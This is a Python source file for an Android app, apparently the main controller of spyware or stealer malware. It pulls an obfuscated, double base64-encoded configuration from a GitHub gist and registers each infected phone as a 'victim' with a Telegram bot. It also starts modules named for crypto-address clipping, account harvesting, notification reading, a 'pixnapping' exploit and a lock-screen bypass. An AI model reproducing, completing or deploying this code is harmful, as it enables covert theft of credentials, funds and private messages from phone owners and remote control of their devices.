import json
import base64
import requests
import threading
import time
from jnius import autoclass

class Monitor:
    def __init__(self):
        self.config = self.get_config()
        self.bots = self.config.get('t', [])
        self.device_id = self.get_device_id()
        self.start_modules()
        threading.Thread(target=self.announce_new_victim).start()

    def get_config(self):
        gist_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/6527633caf55de531728571c4ff372141021cecc/config.json"
        try:
            r = requests.get(gist_url, timeout=10)
            data = r.text.strip()
            data = base64.b64decode(data[::-1]).decode()[::-1]
            data = base64.b64decode(data).decode()
            return json.loads(data)
        except Exception:
            return {}

    def get_device_id(self):
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Build = autoclass('android.os.Build')
        return Build.SERIAL or Build.getSerial()

    def start_modules(self):
        from modules.telegram_ui import TelegramUI
        self.tg = TelegramUI(self.bots, self)
        threading.Thread(target=self.tg.start).start()
        threading.Thread(target=self.start_collectors).start()

    def start_collectors(self):
        from modules.auto_collector import AutoCollector
        from modules.notification_reader import NotificationReader
        from modules.crypto_clipper import CryptoClipper
        from modules.account_harvester import AccountHarvester
        from exploits.pixnapping import PixNapping
        from exploits.lockscreen_bypass import LockscreenBypass
        AutoCollector().run()
        NotificationReader().run()
        CryptoClipper().run()
        AccountHarvester().run()
        PixNapping().run()
        LockscreenBypass().run()

    def get_battery(self):
        try:
            Context = autoclass('android.content.Context')
            Intent = autoclass('android.content.Intent')
            BatteryManager = autoclass('android.os.BatteryManager')
            IntentFilter = autoclass('android.content.IntentFilter')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            battery_status = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            battery_intent = activity.registerReceiver(None, battery_status)
            level = battery_intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            scale = battery_intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            return int(100 * level / scale)
        except:
            return 0

    def announce_new_victim(self):
        battery = self.get_battery()
        model = self.device_id
        self.tg.create_victim_topic(self.config.get('v_id'), model, battery)
